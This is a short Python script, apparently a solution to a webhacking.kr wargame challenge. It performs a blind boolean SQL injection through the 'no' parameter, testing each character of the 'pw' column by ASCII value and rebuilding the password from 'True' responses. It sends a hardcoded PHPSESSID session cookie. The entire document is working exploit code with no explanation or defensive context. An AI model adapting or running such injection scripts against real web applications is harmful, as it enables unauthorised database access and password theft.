import urllib, requests, time
flag = ''
lenght = 0

session={'PHPSESSID':"b3443541331e3ff78d360b76cd4b4fbd"}

for i in range(1,20):
    for j in range(32,127):
        try:
            r = requests.post("http://webhacking.kr/challenge/bonus/bonus-1/index.php?no=2 and ascii (substr(pw, "+str(i)+",1))="+str(j),cookies=session)
        except:
            print (" exception")
            continue
        if 'True' in r.text:
            flag = flag + chr(j)
            break
        time.sleep(0.1)

print (" pw " + flag) 